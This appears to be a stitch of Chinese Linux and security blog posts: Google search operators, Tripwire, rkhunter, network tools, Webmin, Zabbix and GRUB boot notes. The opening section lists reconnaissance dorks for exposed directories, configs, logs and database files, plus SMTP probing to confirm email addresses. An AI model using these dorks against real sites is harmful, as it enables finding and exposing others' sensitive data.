inanchor 操作符搜索的是锚点，或者说是链接上显示的文本 Cache ：显示网页的缓存版本 Numrange ：搜索数字 numrang操作符需要两个参数，一个是最小数，一个是最大数，以破折号分隔。 例如，查找12345：numrange:12344-12346或简写12344..12346 Daterange ：查找在某个特定日期范围内发布的网页 这个操作符的参数通常也必须表示为一个范围，即用破折号分开的两个日期。如果你只想查找某个特定日期索引的网页，必须提供同样的日期两次，并以破折号分开。 Info ：显示Google的摘要信息 该操作符的参数必须是: 一个有效的URL或者网站名。 Related ：显示相关站点 Author ：搜索Groups中新闻组帖子的作者 Group ：搜索Group标题 可以用来在Google Groups帖子的标题中搜索含有关键字的帖子。 group操作符并不能很好地和其他操作符混合使用。 Insubject ：搜索Google Group主题行 insubject操作符实际上和intitle搜索是一样的，它们返回同样的结果。 as_Msgid ：通过消息ID来查找Group帖子 Stocks ：搜索股票信息 这个操作符的参数必须是一个有效的股票简称 stocks操作符不能和其他的操作符 及搜索关键字同时使用。 Define ：显示某个术语的定义 define操作符不能和其他操作符或搜索关键字混合使用。 Phonebook ：搜索电话列表 phonebook操作符可以用来搜索商业和住宅电话列表。 例如：phonebook: john ny是johb在 view ：以什么形式展示 在Web查询的结尾放上view:map或者yview:timeline，以便在地图视图或者一个酷酷的时间轴视图中查看结果。 其他操作符 。。。。。。 操作符的混合使用 基础 使用缓存进行匿名浏览 可以实现匿名浏览，如果配合代理服务器效果更好：通过语法查找inurl:\"nph-prxy.cgi \"start browsing\"等 选项cached text only其实是添加了换一个\u0026strip=1参数，强制只显示缓存文本，禁止任何外部引用 Google的缓存版本页面会对搜索关键字进行高亮显示。但是你可能还不知道可以使用Google的 高亮工具在缓存网页中高亮显示某些并不包含在原始搜索中的关键字。 目录列表 查找目录列表：intitle:\"index.of\" \"parent directory\" 其中.是通配符 查找特定目录：intitle:index.of.admin或intitle:index.of inurl:admin 查找特定的文件：filetype:log inurl:ws_ftp.log，使用filetype和inurl来查找 服务器版本：intitle:index.of server at 服务器版本：intitle:index.of Apache/1.3.24 Server at 等（其他服务器…） 搜索目标是否有列目录 site:\"xpshuai.cn\" intext:index of/ | ../ | Parent Directory 遍历 目录遍历：intitle:index.of inurl:\"/admin/\"和intitle:index.of inurl:\"/var/www/\"等等 递增置换（“取一个数并用下一个更大的或者更小的数来替代这个数”的形象的说法） 拓展遍历（用于查找文件名相同，但是拓展名不同的文件如备份文件–\u003e一旦你找到了HTM文件，就可以应用置换技术来查找具有相同的文件名，但扩展名不同的文件） 文档加工与数据库挖掘 配置文件 inurl:conf OR inurl:config OR inurl:cfg Google黑客在搜索配置文件时常考虑的几点： ●使用可用的配置文件中特有的单词或词组来创建一个强大的基本搜索。 ●过滤掉sample. example、 test. howto和tutorial单 词以剔除明显的示例文件。升5 6 sm ●用-cvs过滤掉CVS存储器，它们通常存放了默认的配置文件。 ●如果是搜索UNIX程序的配置文件，那么就要过滤掉manpage或者Manual（-manpage） ●搜索示例配置文件中最常改变的域，并且对该域执行缩简搜索，以剔除可能的“垃圾”或者样例文件。 常见的配置文件搜索示例： 日志文件 例如：filetype:log username putty Office文档 搜索可能敏感的Office文档的查询样例： 数据库挖掘 登录入口 不管登录入口的安全强弱程度如何，它的存在都暴露了目标可能使用的软件和硬件的类型。简单来说，登录入口非常适合于顺藤摸瓜。 帮助文件 错误消息 数据库转储 实际的数据库文件 如：filetype\"mdb inurl:user.mdb 其他信息搜索 确定E-mail地址 1.查找邮件服务器：host -t mx qq.com 、 Windows上：nslookup -Cqtype=mx qq.com 2.挑选出一个服务器，并且远程登录到端口25：telnet mx1.qq.com 25 3.伪装简单邮件传送协议(SMTP) 4.正面测试 5.反面测试 6.完成，可以确定某个邮箱存在 确定电话号码 通过Google的数字范围(numrange)操作符在一个特定的范围内查找包含的电话号码 先指定起始数字，接着键入..，再键入终止数字。 确定人 特殊的操作符 filetype:ppt site:www.","date":"2020-08-12","objectID":"/google-hacking/:3:0","tags":["Google hacking","搜索引擎"],"title":"Google Hacking","uri":"/google-hacking/"},{"categories":["Linux"],"content":"入侵检测(IDS) 安全的关键在于看见 入侵检测( Intrusion Detection System ) 设备或者软件， 用于监视网络和系统的恶意、违规行为 基于特征、基于异常(流量异常，行为异常..)、基于信誉(依赖机器学习) 基于网络的入侵检测 NIDS 基于主机的入侵检测 HIDS (常用的方法：检查系统文件的完整性) 告警而非实时阻断(联动其他手段实现阻断) 监视和警告文件/目录的变更 IPS(入侵防御系统) / IDP（入侵检测防御系统） Tripwire(绊网) 开源免费的安全和数据完整性检测及告警软件(有企业版) Tripwire 公司 军事和工业领域 Tripwire 基于文件完整性检查的HIDS 对全新安装的系统创建基线库 基于策略生成基线和检查指定文件目录的指定属性(HASH、 Perm、Owner) 安装 sudo apt-get install tripwire # 同时会提示你安装Postfix # 要求你设置密码文（两个密钥对 对文件完整性做签名） # site key 一组服务器主机 相同的site key，适用于重复使用 # local key 只针对我本机的文件加密的情景 # 配置文件会以key加密方式保存的，如果想修改可以修改/etc/tripwire/twcfg.txt然后执行命令来实现 # 要监视的文件目录的策略文件：/etc/tripwire/twpol.txt 文件结构 ls /etc/tripwire site.key xps-local.key tw.cfg # 加了密的 twcfg.txt # 配置文件。 tw.pol twpol.txt # 策略文件。rulename 策略名 # 其中变化很大的文件要根据情况来进行监控 # 可以在策略文件，自己添加新的规则 初始化数据库 ls /var/ib/tripwire/ # 存放文件完整性的数据库 sudo tripwire --init # 要先进行数据库初始化 No such file or directory # 会有这个提示信息，Error就不正常了（有的文件不存在） vi /etc/tripwire/twpol.txt # 要注释所有不存在的文件/目录 sudo twadmin -m P /etc/tripwire/twpol.txt # 然后基于修改之后的策略文件，重新生成pol文件 sudo tripwire --init #重新初始化数据库 检查验证 sudo tripwire --check # 检查 # 查看验证结果 添加规则 vi /etc/tripwire/twpol.txt # Rules for Project { rulename = \"Project Ruleset\", severity = $(SIG_ HI) } { /project -\u003e $(SEC CRIT); } sudo twadmin -m P /etc/tripwire/twpol.txt # 先创建上面策略文件中的文件，否则会报错文件不存在 # 重新初始化数据库 sudo tripwire --init 基于上次最新的检查日志(增量型的方式)，来进行更新 ##更新数据库(本地系统更新) ll /var/lib/tripwire/report # 每次数据库变更都要执行一次 tripwire -mu-a -S -C /etc/tripwire/tw.cfg -r /var/ib/tripwire/report/xps.twr # 或者使用下面这个方式，一次执行即可 tripwire --update -- accept-all ## 查看报告（r 读取。这样的方法更加详细） twprint -m r -F /var/lib/tripwire/report/xps-2020801-100037.twr ## 查看数据库(d 数据。内容很多) twprint -m d -d /path/to/database.twd ","date":"2020-08-01","objectID":"/ubuntu-server-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8Bids/:1:0","tags":["IDS","Tripwire"],"title":"ubuntu server-入侵检测IDS","uri":"/ubuntu-server-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8Bids/"},{"categories":["Linux"],"content":"补充命令 硬件信息 # 安装 sudo apt install Ishw # 查看 sudo lshw # 输出结果 sudo lshw -html \u003e hwinfo .html 硬盘信息 # 安装 sudo apt install hdparm hdparm -i /dev/sda hdparm -I /dex/sda # 更加详细信息 ","date":"2020-08-01","objectID":"/ubuntu-server-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8Bids/:1:1","tags":["IDS","Tripwire"],"title":"ubuntu server-入侵检测IDS","uri":"/ubuntu-server-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8Bids/"},{"categories":["Linux"],"content":"网络带宽 开测试防火墙性能NetIO 光纤专线的带宽是否缩水 实际承受的流量 iperf3 模拟出来的流量并非真实带宽 ","date":"2020-08-01","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/:1:0","tags":["网络工具","ubuntu","带宽监测"],"title":"ubuntu server-网络工具","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"测试网络带宽 iperf3 支持TCP/SCTP/UDP协议 跨平台 多连接(模拟多用户) 支持IPv6 安装 # 服务端和客户端都是这一个软件包 apt install iperf3 # 默认侦听端口：5201 参数 # iperf3 -p, --port # server port to listen on/connect to -f, --format #[kmgKMG] format to report: Kbits, Mbits, KBytes, MBytes -i, --interval # seconds between periodic bandwidth reports -F, --file name # xmit/recv the specified file， 指定文件打到对方 -A, --affinity n/n,m set CPU affinity -B, --bind \u003chost\u003e bind to a specific interface -V, --verbose more detailed output -J, --json output in JSON format --logfile f send output to a log file -d, --debug emit debugging output -v, --version show version information and quit -h, --help show this message and quit Server specific: -s, --server run in server mode -D, --daemon run the server as a daemon # 后台运行 -I, --pidfile file write PID file -1, --one-off handle one client connection then exit # 只接收第一个客户端的测试 Client specific: -c, --client \u003chost\u003e run in client mode, connecting to \u003chost\u003e -u, --udp #use UDP rather than TCP -b, --bandwidth #[KMG][/#] target bandwidth in bits/sec (0 for unlimited) # 限制流量带宽 (default 1 Mbit/sec for UDP, unlimited for TCP) (optional slash and packet count for burst mode) -t, --time # time in seconds to transmit for (default 10 secs) # 测试时长(默认10s) -n, --bytes #[KMG] number of bytes to transmit (instead of -t) -k, --blockcount #[KMG] number of blocks (packets) to transmit (instead of -t or -n) -l, --len #[KMG] length of buffer to read or write (default 128 KB for TCP, 8 KB for UDP) --cport \u003cport\u003e bind to a specific client port (TCP and UDP, default: ephemeral port) -P, --parallel # number of parallel client streams to run # 并发数量 -R, --reverse run in reverse mode (server sends, client receives) -w, --window #[KMG] set window size / socket buffer size -C, --congestion \u003calgo\u003e set TCP congestion control algorithm (Linux and FreeBSD only) -M, --set-mss # set TCP/SCTP maximum segment size (MTU - 40 bytes) -N, --no-delay set TCP/SCTP no delay, disabling Nagle's Algorithm -4, --version4 only use IPv4 -6, --version6 only use IPv6 -S, --tos N set the IP 'type of service' -L, --flowlabel N set the IPv6 flow label (only supported on Linux) -Z, --zerocopy use a 'zero copy' method of sending data -O, --omit N omit the first n seconds -T, --title str prefix every output line with this string --get-server-output get results from server --udp-counters-64bit use 64-bit counters in UDP test packets --no-fq-socket-pacing disable fair-queuing based socket pacing 使用 # 作为服务端 iperf3 -s # 作为客户端，连接服务端 iperf3 -c 192.168.0.111 ","date":"2020-08-01","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/:2:0","tags":["网络工具","ubuntu","带宽监测"],"title":"ubuntu server-网络工具","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"查看当前带宽占用 1.nload 须在问题发生当下执行命令 # 安装 apt install nload # 使用 sudo nload nload -uk -U m enp0s3 # 查看指定网卡流量（如果不指定会自动查找网卡） nload -m # 同时查看多网卡流量 2.iftop 优点：会显示流量通信之间的主机双方 # 安装 apt install iftop # 运行 sudo iftop sudo iftop -n -N # 不解析域名、端口（以ip地址形式显示通信双方） # 其他参数 -p # 混杂模式（凡是流经你网卡的流量都会被探测） -i eth0 # 指定网卡 3.iptraf # 安装两个软件包 sudo apt install iptraf iptraf-ng sudo iptraf-ng # 字符菜单方式展示 # 选择，高亮显示，详细信息，配置... 4. nethogs 可显示每个进程所使用的带宽 # 产生大流量不一定是病毒 # 安装 sudo apt install nethogs 其他工具 ​ …. … ","date":"2020-08-01","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/:3:0","tags":["网络工具","ubuntu","带宽监测"],"title":"ubuntu server-网络工具","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"谣言 Linux系统很安全，从不感染病毒 已知的恶意软件没有Windows系统多 ","date":"2020-08-01","objectID":"/ubuntu-server-rkhunter/:1:0","tags":["Rkhunter","ubuntu","安全检查"],"title":"ubuntu server-Rkhunter","uri":"/ubuntu-server-rkhunter/"},{"categories":["Linux"],"content":"Rootkit 隐藏自身能力超强的恶意软件(一 个或一组) 将自身注入主板芯片、硬盘引导扇区、系统内核、底层驱动 运行级别优先于系统或驻留于内核特权层级 难于发现、难于清除、更换硬件都无法清除 最早是出现在Unix系统上的一类正向技术 有时木马程序也可视为Rootkit 的一种 ","date":"2020-08-01","objectID":"/ubuntu-server-rkhunter/:2:0","tags":["Rkhunter","ubuntu","安全检查"],"title":"ubuntu server-Rkhunter","uri":"/ubuntu-server-rkhunter/"},{"categories":["Linux"],"content":"Rootkit Hunter 安全监视和分析工具(非处置型工具) 检测Rootkit、恶意软件、不安全设置、文件完整性、可疑端口 基于特征匹配 脚本(调用其他通用工具完成检测任务) 运行方式 需要要root权限 只能运行于Bourne类型的shell (bash、 ksh) 手动运行、cron job 安装 sudo apt install rkhunter # 按照向导即可 配置 sudo vi /etc/default/rkhunter CRON DAILY_RUN=\"true\" # 每天自动运行来检查系统 CRON_ DB_ UPDATE=\"true\" # 这里简单修改几项 升级特征库 sudo rkhunter --propupd 执行检查 # 默认对系统所有检查项进行（每一项都需要回车确认，--sk就不用手动敲回车了） sudo rkhunter --check --sk # 检查结果如果显示是绿色的，基本就没啥问题 日志文件 # var/log/rkhunter.log less var/log/rkhunter.log 误报白名单 sudo vi /etc/rkhunter.conf SCRIPTWHITELIST=/usr/bin/egrep SCRIPTWHITELIST=/usr/bin/fgrep SCRIPTWHITELIST=/usr/bin/ldd ","date":"2020-08-01","objectID":"/ubuntu-server-rkhunter/:3:0","tags":["Rkhunter","ubuntu","安全检查"],"title":"ubuntu server-Rkhunter","uri":"/ubuntu-server-rkhunter/"},{"categories":["Linux"],"content":"Webmin 基于WEB的系统远程管理 基于图形化的友好操作界面 多开启一个服务端口，增加了攻击面 Webmin WEB应用程序，完成部分服务器日常管理操作 安装依赖包 apt -y install python apt-show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl 下载安装 # 下载安装 curl -L -O htt://www.webmin.com/download/deb/webmin-current.deb dpkg -i webmin-current.deb # 安装 # 配置允许访问的ip（这里配置本地地址 和 某个网段） vi /etc/webmin/miniserv.conf allow=127.0.0.1 10.0.0.0/24 # 重启服务 systemctl restart webmin 访问 # 访问 https://10.1.1.1:10000 # 使用系统账号登录，建议root ## 管理系统 如果多台服务器，可以用\"广播服务器\"来寻找其他装了Webmin的服务器，在一个web端来统一管理 ","date":"2020-07-31","objectID":"/ubuntu-server-webminuserminxrdp/:1:0","tags":["Webmin","usermin","Xrdp","ubuntu","远程管理"],"title":"ubuntu server-远程管理 Webmin\u0026usermin\u0026Xrdp","uri":"/ubuntu-server-webminuserminxrdp/"},{"categories":["Linux"],"content":"usermin 普通用户自服务usermin 安装依赖包 apt -y install python apt- -show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl 安装 curl -L -0 http:/ /www.webmin.com/download/ deb/usermin-current.deb dpkg -i usermin-current.deb vi /etc/usermin/ miniserv.conf allow=127.0.0.1 10.0.0.0/24 denyuser=root # 禁止root登录usermin systemctl restart usermin 访问 https://10.0.1.12:20000 # ","date":"2020-07-31","objectID":"/ubuntu-server-webminuserminxrdp/:2:0","tags":["Webmin","usermin","Xrdp","ubuntu","远程管理"],"title":"ubuntu server-远程管理 Webmin\u0026usermin\u0026Xrdp","uri":"/ubuntu-server-webminuserminxrdp/"},{"categories":["Linux"],"content":"Xrdp远程桌面 VNC vs XRDP 使用Windows远程桌面连接工具远程管理Linux Server 图形化桌面作为后段 Gnome、 KDE、Xfce (越来越火) 安装Xfce桌面环境 # 以Xfce为例 sudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils 安装XRDP sudo apt install xrdp 配置 sudo vi /etc/xrdp/xrdp.ini exec startxfce4 # 这里是xfce4 重启服务 sudo systemctl restart xrdp 防火墙 sudo ufw allow 3389 sudo ufw allow from 10.0.0.0/24 to any port 3389 # 可以限制来源ip地址 连接 用Windows的远程连接工具(mstsc)连接Linux服务器 ","date":"2020-07-31","objectID":"/ubuntu-server-webminuserminxrdp/:3:0","tags":["Webmin","usermin","Xrdp","ubuntu","远程管理"],"title":"ubuntu server-远程管理 Webmin\u0026usermin\u0026Xrdp","uri":"/ubuntu-server-webminuserminxrdp/"},{"categories":["Linux"],"content":" Zabbix – 最流行的开源的企业级监控系统之一 基本可对全平台，全系统做监控：网络设备、操作系统、应用程序 Unix、L inux、Windows、MacOS 监控方式：Agent(硬件设备,被监控机器上安装，自己的作为Zabbix服务器) / Agenless 系统环境 修改：IP(静态)、Hostname、 DNS、NTP # 修改主机名 vim /etc/cloud/cloud.cfg preserve_hostname；true vim /etc/hostname zab.lab.com # 作为zabbix服务器 # 域名解析 10.1.8.132 zab.lab.com # 重启zabbix服务器 安装\u0026配置 1.安装配置Apache # 管理是Web界面，在Zabbix服务器机器上 apt install apache2 vim /etc/apache2/conf-enabled/security.conf ServerTokens Prod # 显示最少的主机头信息 vim /etc/apache2/apache2.conf ServerName zab.lab.com # 主机名 vim /etc/apache2/sites-enabled/000-default.conf ServerAdmin webmaster@lab.com # 重启服务 systemctl restart apache2 2.安装php apt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring # 启动模块 a2enconf php7.2-cgi systemctl reload apache2 vi /etc/php/7.2/apache2/php.ini date.timezone = \"Asia/Shanghai\" # 测试页面 vi /ar/www/htm/index.php \u003chtml\u003e \u003cbody\u003e \u003c?php print \"PHP Test\"; ?\u003e\u003c/body\u003e\u003c/html\u003e 3.安装MySQL apt install mariadb-server mysql_secure_installation # 安全初始化 mysql CREATE DATABASE zabbix_db CHARACTER SET utf8 collate utf8 bin; grant all privileges on zabbix_db.* to zabbix@'localhost' identified by 'pass123'; grant all privileges on zabbix_db.* to zabbix@'%' identified by 'pass123'; flush privileges; 4.安装Zabbix # 下载适合ubuntu发行版本(这里是bionic)的二进制包（根据自己的下载） wget https://repo.zabbix.com/zabbix/4.0/ubuntu/ pool/main/z/zabbix-release/zabbix-release_ 4.0-3+bionic_ all.deb apt install ./zabbix-release_4.0-3+bionic_all.deb \u0026\u0026 apt update # dpkg -i xx 也可；增加了一条zabbix官方源的文件 sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-agent # 这里zabbix-agent安装是因为把zabbix-server自己也纳入监视范围 zcat /usr/share/doc/ zabbix- server-mysql/create.sql.gz | mysql -u zabbix -p zabbix_db # zcat 可以查看压缩文件里面的内容；初始化表结构 # 修改zabbix服务端配置文件中数据库连接密码 vi /etc/zabbix/zabbix_server.conf DBName=zabbix_db DBUser=zabbix DBPassword=pass123 # 重启服务 systemctl restart zabbix-server 5.配置Zabbix # 配置agent（这里是服务端监视自己的agent） vi /etc/zabbix/zabbix_agentd.conf Hostname= zab.lab.com # 让他找到我们的zabbix server的地址 # 重启 systemctl restart zabbix-agent systemctl enable zabbix-server # 开机自启 vi /etc/ apache2/conf-enabled/zabbix.conf Allow from 10.0.0.10/24 # 设置谁能访问我zabbix的管理页面 # 重启apache systemctl restart apache2 6.访问Web\u0026初始化 # htp://zab.lab.com/zabbix/ # 设置数据库连接参数 DB Password Hostname # 登陆: Admin / zabbix # 修改密码 # 添加监视的主机（agent模式下，目标端口要开） 至此，zabbix服务端已经配置完毕 7.在被监控服务器上安装配置agent ## 安装 wget hts://repo.zabbix.com/zabbix/4.0/ubuntu/pool/main/z/zabbix-release/zabbix-release.4.0-3+bionic.all.deb sudo apt install ./zabbix-release_4.0-3+bionic.all.deb sudo apt update sudo apt install zabbix-agent # 安装zabbix-agent # 修改agent服务器的主机名 和 DNS域名解析 # PSK / CA加密服务器与客户端之间的通信 ## 配置 vi /etc/zabbix/zabbix_agentd.conf Server=zab.lab.com # 指向zabbix-server ServerActive=zab.lab.com Hostname= zab.lab.com TLSConnect=psk # 这里设置psk加密的参数 TLSAccept=psk TLSPSKIdentity=PSK 001 # ID必须唯一 TLSPSKFile=/etc/zabbix/zabbix_agentd.psk # 随机生成文件内容 psk的值 openssl rand -hex 32 | sudo tee /etc/zabbix/zabbix_agentd.psk sudo systemctl start zabbix-agent sudo systemctl enable zabbix-agent 8.服务端添加agent # Web界面 Configuration -\u003e Hosts -\u003e Create host -\u003e ... -\u003e Template(指定监视目标的什么服务) -\u003e Security(都选择PSK, agent的id, psk的值) ","date":"2020-07-31","objectID":"/ubuntu-server-zabbix/:0:0","tags":["Zabbix","ubuntu","监控"],"title":"ubuntu server-Zabbix","uri":"/ubuntu-server-zabbix/"},{"categories":["Linux"],"content":"BIOS/UEFI 打开黑箱看看里面 操作系统是如何启动的 三个彼此独立但相互关联的过程 1.Bios/UEFI自检过程（POST） - 加电自检 - 硬件识别与检测 # UEFI比较新，原理和效果不一样 2.Boot Load加载执行过程 引导加载程序允许您选择想要引导的操作系统 3.操作系统启动过程 启动各种服务及操作系统本身 BIOS 打开黑箱看看里面 主板芯片（计算机运行的第一个程序） - 执行基本的检查或开机自测(POST) - 识别连接在计算机上的所有硬件、可用性、底层参数 例如内存、硬盘、键盘和显卡等 - 不同的BIOS可以设置检查参数 - 轮训硬盘控制器，启动其板载芯片，配置RAID等 - 引导顺序 - 不当的配置可导致计算机无法使用 UEFI 打开黑箱看看里面 较新的主板支持UEFI (2015年以后) - 视觉上与BIOS相似，但原理极不相同 - 运行速度略快于BIOS - 创建UEFI是为了克服BIOS的故有缺陷 - BIOS运行基于16位处理器，UEFI基于现代处理器 - 内存使用量方面，BIOS有 限，UEFI按需要量使用 - BIOS只能读取MBR引导操作系统; UEFI可读取系统安装时划分的独立分区 - BIOS支持最大2T的硬盘，UEFI使用GPT分区表，最大支持8-9Z硬盘 安全引导(Secure-boot) 打开黑箱看看里面 - 恶意软件可通过Boot Loader加载到系统中 - UEFI提供了安全引导 Secure-boot - 加载前通过公钥/私钥验证签名的引|导加载程序和硬件 - 64位操作系统支持Secure-boot,某些硬件无法更改操作系统类型（如某些电脑厂商不让电脑装其他系统，他给锁死了，要问好Secure-boot能不能关或在开启Secure-boot时候能不能按其他系统。其实建议Secure-boot开启） - 目前绝大多数硬件同时支持BISO/UEFI，可自行选择启动 硬盘分区表 打开黑箱看看里面 - 分区表通常位于硬盘起始位置 - 记录硬盘的划分情况 - 两种类型：MBR / GPT ","date":"2020-07-30","objectID":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/:1:0","tags":["Linux","ubuntu","引导过程","BIOS","UEFI","grub","内核"],"title":"ubuntu server-引导过程","uri":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/"},{"categories":["Linux"],"content":"Boot Loader 打开黑箱看看里面 BIOS/UEFI不关系统安装的操作系统 POST自检结束后，BIOS/UEFI读取硬盘Boot Loader 读取并执行Boot L oder，由其引|导操作系统 Linux世界里两大Boot Loader程序 LILO:基本已被废弃 GRUB:目前绝大多数发行版采用 BIOS引导过程 打开黑箱看看里面 BIOS -\u003e Boot Loader (GRUB2) 第一阶段：boot.img读取并运行MBR硬盘起始的446字节 第二阶段：boot.img 查找并运行core.img (通常位于MBR Gap) core.img的任务是访问/boot/grub，加载该目录下的所有模块 加载启动菜单，自动或手动选择进一步引导的系统内核 UEFI引导过程 打开黑箱看看里面 第一阶段 UEFI读取GPT分区表，找到EFI分区(格式Fat32 / 大小默认537M / boot esp ) 从中读取、执行boot loader代码，加载模块 命令parted 一print (读的是文件：/boot/efi/EFl/ubuntu/ grubx64.efi) sudo parted # 查看 分区的信息 print # disk 工具也可来查看分区 第二阶段 查找/boot/grub/x86_ 64- -efi/core.efi 执行 生成GRUB2菜单， 选择不同内核引导系统(内核二进制文件:vmlinuz-\u003crelease- number\u003e ) 加载硬件驱动文件initrd.img到内存中，然后控制权交给内核，继续引导 系统加载systemd / upstart / init, 启动各服务 GRUB2 GRUB是一个强大的多引导加载程序 - Windows --下的引导程序--\u003e ntldr # 不兼容Linux - MacOS ---\u003e Boot Camp 两种启动方式 -直接查找和加载所需的内核 -加载另一个引导加载程序 操作系统引导的四个核心组件 内核文件、驱动器名称、内核文件所在分区号、初始化RAM盘 GRUB菜单 GRUB菜单文件 /boot/grub/grub.cfg (自动生成，不可修改) 主要来源文件/etc/grub.d/* 菜单定义: menuentry / submenu 显示菜单 - Vi /etc/default/grub GRUB_TIMEOUT_STYLE=menu # 让他显示菜单 GRUB_TIMEOUT=100 # 超时时间（100s如果不做选择，就启动默认的） sudo update-grub 单用户模式 类似于Windows启动时F8灾难恢复模式 BIOS: Shift UEFI: Esc GRUB菜单 -“e\" -在引导项最后增加“single\" - Ctrl+ X 进入 手动生成GRUB菜单文件 sudo grub-mkconfig --output mygrub.cfg 安全风险 恶意用户可能修改boot loader, 造成安全问题 设置GRUB密码 sudo vi /etc/grub.d/40_custom # custom的文件在更新系统后不会被覆盖 set superusers=xps password yuanfh pass123 sudo update--grub 以上明文存储GRUB密码存在风险隐患 # 使用工具 grub-mkpasswd-pbkdf2 grub-mkpasswd-pbkdf2 # 输入密码，会生成一段密文 sudo vim /etc/grub.d/40_custom password_pbkdf2 xps grub.pbkdf2.sha512 ...... # 上面的密文放到配置文件中 sudo update--grub # 此方法不适合远程托管到IDC机房的机器（一重启在grup时就要输入密码，此时SSH还未连接） # 指定启动项用户 menuentry --\u003e --users xps 其他BootLoader(LILO, Grub之外的) 1.SYSL INUX 从FAT分区引导系统的BootLoader (U盘启动时) 2.EXTL INUX # 小型的Linux 从ext2、ext3、 ext4、 btrfs引导系统的小型BootLoader 3.ISOL .INUX # 光盘启动 从LiveCD、LiveDVD引导系统的BootLoader # isolinux.bin 映像文件; isolinux.cfg 配置文件 4.PXELINUX (无盘站–\u003e无硬盘)从网络服务器引导系统的BootLoader PXE（Pre-boot eXecution Environment） 使用DHCP为工作站分配IP 使用BOOTP加载BootLoader映像 TFTP将引导映像传输至工作站(基于UDP协议) /tftpboot/ pxelinux.0 : PXE BootLoader /tftpboot/ pxelinux.cfg :配置文件 目前新版支持NFS、HTTP、FTP服务器 系统无法启动! 两大问题原因 内核问题：手动安装内核时缺少模块、库文件(发行版错误) 驱动器故障：无法读取根驱动器 处理办法: 使用先前无故障版本内核引导系统 单用户模式(指定内核参数) 对于驱动器故障，可以使用救援盘(CD/DVD、USB) 检修硬盘：fsck /dev/sda1 显示GRUB菜单 可以开机一直按住ESC键、或SHIFT键（在故障发生时，且没修改过grup菜单显示时） ","date":"2020-07-30","objectID":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/:2:0","tags":["Linux","ubuntu","引导过程","BIOS","UEFI","grub","内核"],"title":"ubuntu server-引导过程","uri":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/"},{"categories":["Linux"],"content":"操作系统启动 服务/Service (windows) ==后台/daemon (Linux) INIT：内核引导后运行第一个程序INIT,初始化操作系统并启动服务(直到关机) - 内核加载后的初始化进程，用于启动其他程序 - 所有服务启动由init 程序处理(PID=1) ，所有系统服务进程都是其子进程 - pstree -p 1 - /usr/sbin/init -\u003e /lib/ systemd/systemd 现在的init程序早已不是以前那个init，只是沿用，实则是个符号链接 - 早期版本配置文件：/etc/inittab (ubuntu无此文件！) ","date":"2020-07-30","objectID":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/:3:0","tags":["Linux","ubuntu","引导过程","BIOS","UEFI","grub","内核"],"title":"ubuntu server-引导过程","uri":"/ubuntu-server-%E5%BC%95%E5%AF%BC%E8%BF%87%E7%A8%8B/"},{"categories":["Linux"],"content":"三种INIT 接上面 1.SysV / SysV-init 源自UNIX System V (目前老版本Linux还在使用) 2.Upstart 兼容SysV，Ubuntu意图用于替换SysV，其他发行版也有使用 几乎没有完整实现的Upstart（Ubuntu自己都不用Upstart了） 3.Systemd 目前主流发行版使用systemd-sysv包兼容SysV格式的initd脚本 始于2010年，是目前最新的系统初始化后台程序; 速度更快，效率更高 SysV 分成不同运行级别的一组Shell脚本(哪些程序，什么时候运行) 每个程序有一个独立的脚本控制其启动或停止 系统启动时进入一个运行级(一组随系统启动的程序) 内核启动首先读取运行级别配置文件，决定进入哪个运行级 运行级别： 0 关机 1 单用户模式(系统维护) 2 Debian多用户图形模式、 3 多用户文本模式 4 未定义 5 RedHat多用户图形模式 6 重启系统 # 不同发行版可能略有不同 在不同运行级下启动程序的方法 方法1：/etc/ inittab：定义不同运行级下启动的程序，每行定义一个应用程序 id:runlevels:action:process #- ID: 包含1-4个字符，唯一标识一个程序 #- runlevel: 运行级列表(在哪个运行级中运行该程序，例如: 345) #- action: #- id:3:initdefault: 系统启动后默认进入的运行级 方法2：启动脚本 /etc/init.d/下的脚本 /etc/rc1.d为例是不同级别1下要运行的程序(符号链接)，K开头表示kill掉,S是启动，后面数字的值代表优先级，最后面代表程序的名称 除了运行级，SysV也使用启动脚本控制程序启动、停止 启动脚本存放于/etc/init.d/中，通过/etc/rcX.d/目录调用(X 运行级) 脚本文件名S: Start; K: Kill/Stop， 数字表示优先级(依赖顺序) 通过具体脚本启动停止程序稍嫌麻烦，系统包含工具指定脚本的运行级 # 给我们提供了管理工具 chkconfig / update-rc.d #用于查看和修改程序的运行级(RedHat / Debian) chkconfig --list \u003cprogram_name\u003e #查看 chkconfig -- levels 12345 \u003cprogram_name\u003e on #设置 update-rc.d program defaults / update rc.d \u003cprogram_name\u003e remove update- -rc.d -f \u003cprogram_name\u003e start 40 2 34 5. stop 80 0 1 6. #具体运行级别和顺序(在那几个级别启动这个程序，在那几个级别stop这个程序) 40、80指在具体运行级中程序的启动顺序(0-99) action字段(在Ubuntu中已经找不到了) boot 进程在系统扃动时启动 bootwait 进程在系统启动时启动，系统会等待它启动完成 initdefault 系统默认进入的运行级别 kbrequest 进程在按下特殊的组合键后启动 once 当进入运行级别时，进程启动一次，后面down了也就不管了 powerfail 系统关闭时才运行 